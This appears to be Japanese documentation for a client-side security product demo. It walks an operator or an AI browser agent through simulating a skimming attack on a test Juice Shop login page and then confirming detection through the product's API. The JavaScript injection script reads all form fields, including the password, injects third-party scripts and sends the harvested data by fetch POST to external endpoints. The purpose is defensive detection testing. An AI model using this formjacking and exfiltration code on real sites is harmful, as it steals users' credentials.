フェーズ2では、保護されたアプリケーションに対してシミュレートされた攻撃トラフィックを生成し、CSDがそれを検出したことを確認します。フェーズ1が完了していること（すべてのステップ7のチェックがPASS）が前提条件です。

## ステップ8：攻撃シミュレーション

<Aside type="note">
このステップにはブラウザサイドのJavaScript実行が必要です — `curl`ではCSD検出をトリガーできません。ブラウザ自動化ツール（MCP Chrome DevTools、Playwright、Puppeteer）を持つAIアシスタントは、以下の**AI自動実行**シーケンスを使用してこれらのステップを直接実行します。ブラウザ自動化ツールを持たないオペレーターは手動ステップを実行します。
</Aside>

インフラストラクチャが検証された後（すべてのフェーズ1ステップ7のチェックがPASS）、攻撃シミュレーションスクリプトを実行してCSD検出を生成します。スクリプトは[検出のトリガー](/csd/trigger-detection/)ガイドと[攻撃スクリプトライブラリ](/csd/attack-scripts/)で定義されています。

### AI自動実行

ブラウザ自動化ツールを持つAIアシスタントは、攻撃シミュレーションをプログラム的に実行します：

1. **initScriptを使用してナビゲート** — まず`about:blank`にナビゲートしてクリーンなドキュメントコンテキストを確保し（前回のナビゲーションからの古いinitScriptを回避）、次に`navigate_page`で`http://$F5XC_DOMAINNAME/#/login`にナビゲートします。`initScript`では、zone.jsがパッチする前にネイティブの`setInterval`、`clearInterval`、`fetch`、`console.log`を保存し、ログインフォームフィールドをポーリングし、ネイティブの`HTMLInputElement.prototype.value`セッターで認証情報を入力し、Combined Detection Scriptをインラインで即時実行します。以下のinitScriptをそのまま使用してください。
2. **ウェルカムバナーを閉じる** — `press_key`で`Escape`を押してウェルカムバナーを閉じます。後続のアクセスではバナーが表示されない場合があります（Cookieが保持されているため）。Cookie同意ダイアログもEscapeキーで自動的に閉じられます。
3. **完了を待つ** — すべてのCDNスクリプトのロード/エラーコールバックとfetchプロミスの解決が完了するまで10秒待ちます。
4. **証拠を取得** — `list_console_messages`で`[CSD Demo] Simulation complete`とCDNロード結果を確認します。`list_network_requests`を`script`と`fetch`タイプでフィルタリングして、HTTPステータスコード（成功は`200`/`201`、保留中のリクエストは`pending`）を検証します。

**フェーズ2 initScript（そのまま — 記載通りに正確に使用してください）：**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('#email');
  var passEl  = document.querySelector('#password');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

<Aside type="caution">
**zone.jsの非互換性** — Juice ShopはAngularのzone.jsを使用しており、`setTimeout`、`setInterval`、`fetch`、`XMLHttpRequest`、その他のブラウザAPIにパッチを適用します。これにより、MCPの`evaluate_script`、`fill`、`click`ツールが`Cannot read properties of undefined (reading 'call')`エラーで動作しなくなります。代わりに`navigate_page`と`initScript`を使用してください — `initScript`はzone.jsがロードされる前に実行されるため、ネイティブAPIの参照を保存してポーリングコールバックで使用できます。initScriptでは、フォームフィールドの入力にネイティブの`HTMLInputElement.prototype.value`セッター（`fill`ではなく）を使用し、検出スクリプトをインラインで実行する必要があります（ページロード後にzone.jsがインターセプトする可能性がある`setTimeout`ではなく）。詳細は[検出のトリガー — AI自動実行](/csd/trigger-detection/#ai-automated-execution)を参照してください。
</Aside>

<Aside type="note">
**initScriptの蓄積** — `initScript`パラメータ付きの`navigate_page`呼び出しは、以降のすべてのドキュメントロードで実行される永続リストにスクリプトを追加します。古いスクリプトの干渉を避けるため、実行間に`about:blank`にナビゲートするか、`new_page`と`isolatedContext`を使用してクリーンなブラウザコンテキストを取得してください。
</Aside>

<Aside type="note">
**initScriptでのネイティブ`fetch`の保存** — initScriptはzone.jsがパッチする前に`window.fetch.bind(window)`を保存します。これにより、zone.jsの`Cannot read properties of undefined`エラーなしでfetch呼び出しが正しく動作します。同じinitScript（ネイティブ`fetch`を保存）がフェーズ2とフェーズ3の両方の攻撃実行に使用されます — CSD緩和策は`fetch()`呼び出しをインターセプトしないため、ネイティブ参照の保存は緩和策の動作に影響しません。
</Aside>

<Aside type="caution">
**一時的なオリジン404** — Angularアプリケーションへの初回ナビゲーション時に、`polyfills.js`やその他のアプリスクリプトがオリジンサーバーから一時的なHTTP 404を返す場合があります。これによりAngularのブートストラップが失敗し、ログインフォームのない空白ページが表示されます。404は一時的なものであり、後続のリクエストでは200または304が返されます。**復旧方法：**`about:blank`にナビゲートし、2秒待ってからナビゲーションを再試行してください。複数回の再試行後も問題が続く場合は、ロードバランサーパスでオリジンの正常性を確認してください（`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`）。
</Aside>

### 手動実行

ブラウザ自動化ツールを持たないオペレーターは、以下のステップを手動で実行します：

1. 保護されたアプリケーションのログインページに**ナビゲート**します：`http://xF5XC_DOMAINNAMEx/#/login`
2. **ダミー認証情報を入力** — Emailフィールドに`test@example.com`、Passwordフィールドに`P@ssword123`を入力します（フォームは送信しないでください）
3. **DevToolsを開く** — **F12**を押して**Console**タブに切り替えます
4. **Combined Detection Scriptを実行** — [検出のトリガー &mdash; Combined Simulationスクリプトの実行](/csd/trigger-detection/#run-the-combined-simulation-script)からスクリプトをコンソールに貼り付けてEnterを押します
5. **コンソール出力を確認** — `[CSD Demo]`のフェーズ別出力が以下を表示していることを確認します：フィールドのハーベスティング、4つのCDNドメインからのスクリプトインジェクション、2つのエンドポイントへのデータ窃取

### トリガーされる内容

| シグナル | 動作 | 検出 |
| --- | --- | --- |
| フォームフィールドのハーベスティング | メールとパスワードの入力値を読み取る | 機密フォームフィールドを読み取るスクリプト — 高リスクとしてフラグ付け |
| スクリプトインジェクション | `cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io`から4つの`&lt;script&gt;`タグをインジェクト | 最大4つの新しいサードパーティスクリプトドメインを検出（CDNの可用性により異なる） |
| データ窃取 | ハーベストしたデータを`fetch`で`www.httpbin.org`と`jsonplaceholder.typicode.com`に送信 | 外部ドメインへのネットワーク呼び出し |

<Aside type="note">
**CDNの可用性は変動します。** すべての実行で4つのCDNスクリプトすべてがロードされるわけではありません — ブラウザのリソース制限、ネットワーク状態、またはCDNスロットリングにより、一部が`ERR_INSUFFICIENT_RESOURCES`やタイムアウトで失敗する場合があります。**いずれかの**CDNスクリプトがロードされればシミュレーションは成功です。CSDはスクリプトが正常にロードされたかどうかに関わらずインジェクションの試行を検出します — `&lt;script&gt;`タグの作成自体が検出シグナルです。

重大なケースでは、`ERR_INSUFFICIENT_RESOURCES`がページレベルの障害にエスカレートする可能性があります — ページ全体が空白になり、スクリーンショットがタイムアウトし、`take_snapshot`が失敗します。これは通常、重いinitScriptを持つ複数のナビゲーションが同じブラウザコンテキストに蓄積された後に発生します。**復旧方法：**`new_page`と`isolatedContext`を使用してフレッシュなブラウザコンテキストを作成し、`about:blank` → initScript付き`navigate_page`のシーケンスから再試行してください。これは個別のCDNスクリプトの失敗とは異なり、後者はシミュレーションの成功に影響しません。
</Aside>

<Aside type="tip">
攻撃シミュレーション実行後、以下の確定的なポーリングループを使用して検出を待ちます：

1. 60秒ごとに`/detected_domains`をクエリ
2. DET-3がパスした場合（窃取ドメインが`/detected_domains`に表示された場合）、直ちにステップ9に進む
3. 10回のクエリ後（10分後）もまだ空の場合、CSDステータス（フェーズ1ステップ5）と保護ドメインの登録（フェーズ1ステップ6）を確認 — いずれかの設定が誤っている可能性が高い
4. 30回のクエリ後（30分後）もまだ空の場合、停止してオペレーターに報告 — フェーズ3に進まない

追加のターゲットシミュレーション（個別の攻撃カテゴリ、最大検出ストレステスト）については、[攻撃スクリプトライブラリ](/csd/attack-scripts/)を参照してください。
</Aside>

### 証拠

AIアシスタントは以下を報告する必要があります。AI自動実行の場合、証拠は`list_console_messages`を介してプログラム的にキャプチャされます（initScriptのポーリング関数がコンソールに結果をログ出力します）。手動実行の場合、オペレーターがブラウザコンソールの出力を読み取ります。

| チェック | 期待される結果 | ステータス |
| --- | --- | --- |
| ログインページのロード | `http://$F5XC_DOMAINNAME/#/login`で`200 OK` | PASS / FAIL |
| コンソールスクリプトの実行 | コンソール出力に`[CSD Demo] Simulation complete` | PASS / FAIL |
| フィールドのハーベスト | コンソール出力でカウントが0より大きい | PASS |
| スクリプトのインジェクション | コンソール出力に1〜4つのCDNドメイン（一部はリソースエラーで失敗する場合あり） | いずれかのCDNドメインが表示されればPASS |
| 窃取チャネル | コンソール出力に2つのfetch POSTの試行 | PASS |

<Aside type="tip">
HTTPS LB証明書が有効（`CertificateValid`）な場合、オプションで`https://$F5XC_DOMAINNAME/#/login`に対してもシミュレーションを実行できます。これはデモの進行には必須ではありません。
</Aside>

## ステップ9：APIによる検出検証

CSD APIエンドポイントをクエリして、検出が表示されたことを確認します。ポーリングループを使用します：60秒ごとに`/detected_domains`をクエリし、DET-3がパスし次第進みます。10分後にDET-3がパスしない場合は、CSD設定を確認してください。30分後にDET-3がパスしない場合は、停止してオペレーターに報告してください。これらのエンドポイントは[APIリファレンス](/csd/api-reference/)に文書化されており、前のステップと同じ認証およびネームスペースを使用します。

<Aside type="note">
**エンドポイントの処理順序：** `/detected_domains`が最初に投入され、CSDパイプラインが動作していることの主要な指標です。`/scripts`と`/formFields`はより遅いバックエンド処理スケジュールで投入され、複数のシミュレーション実行後でも20〜30分間空のままになる場合があります。`/detected_domains`が窃取ドメイン（`www.httpbin.org`、`jsonplaceholder.typicode.com`）を表示している場合、シミュレーションは正常に検出されたと見なして進めてください — 以下のDET-1チェックはこれを反映しています。
</Aside>

### 検出されたスクリプト

過去24時間に検出されたスクリプトをクエリします：

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s -X POST \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  -H "Content-Type: application/json" \
  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
```

| フィールド | 期待される結果 | ステータス |
| --- | --- | --- |
| `total` | 0より大きい（スクリプトが検出された） | 0より大きい場合PASS；0だが`/detected_domains`が窃取ドメインを表示している場合PENDING |
| スクリプト名 | `script_name`にCDNドメイン（`cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io`）が含まれる | インジェクトされたCDNドメインが表示されればPASS |

### 検出されたドメイン

```bash
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
```

| フィールド | 期待される結果 | ステータス |
| --- | --- | --- |
| `total_domains` | 0より大きい | 0より大きい場合PASS |
| ドメインリスト | CDNおよび窃取ドメインが含まれる | 期待されるドメインが表示されればPASS |

### フォームフィールド

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
```

| フィールド | 期待される結果 | ステータス |
| --- | --- | --- |
| `total` | 0より大きい | 0より大きい場合PASS；0だがDET-3がパスしている場合PENDING |
| `name` | `email`、`password`が含まれる | 機密フィールドが表示されればPASS |
| `sensitivity` | メール/パスワードフィールドに対して`Sensitive` | MLが正しく分類した場合PASS |

<Aside type="note">
**フォームフィールドの処理はドメイン検出より遅くなります。** `/formFields`エンドポイントは、最初のクエリ時に部分的なメタデータを持つフィールドを返す場合があります。MLの機密性分類（`Sensitive`対`Not Sensitive`）はバックエンド処理が完了した後に投入されます — 最初のシミュレーション実行から20〜30分かかる場合があります。フィールドが表示されているが分類がない場合は、後で再クエリしてください。DET-3（`/detected_domains`）が主要なパス基準です。
</Aside>

### フェーズ2証拠サマリー

すべての検出クエリ完了後、最終的な検出ステータスを提示します：

| テストID | チェック | ステータス |
| --- | --- | --- |
| DET-1 | スクリプトが検出された（`/scripts`エンドポイント） | 0より大きい場合PASS；空だがDET-3がパスしている場合PENDING |
| DET-2 | CDNドメインが検出された | PASS / FAIL |
| DET-3 | 窃取ドメインが検出された（`/detected_domains`） | **主要指標** — `www.httpbin.org`または`jsonplaceholder.typicode.com`が表示されればPASS |
| DET-4 | フォームフィールドが検出された（`/formFields`エンドポイント） | 0より大きい場合PASS；空だがDET-3がパスしている場合PENDING |

<Aside type="note">
**フェーズ3に進むための最低パス基準：** DET-3がPASSであること（窃取ドメインが`/detected_domains`に表示されていること）。DET-1とDET-4は、初回使用時またはフレッシュリビルド後にPENDINGを表示する場合があります — これは正常です。DET-3も30分後にFAILを表示する場合は、CSDが有効であること（フェーズ1ステップ5）、保護ドメインが登録されていること（フェーズ1ステップ6）、CSD JSタグがインジェクトされていること（フェーズ1ステップ7 JS設定チェック）を確認してください。
</Aside>
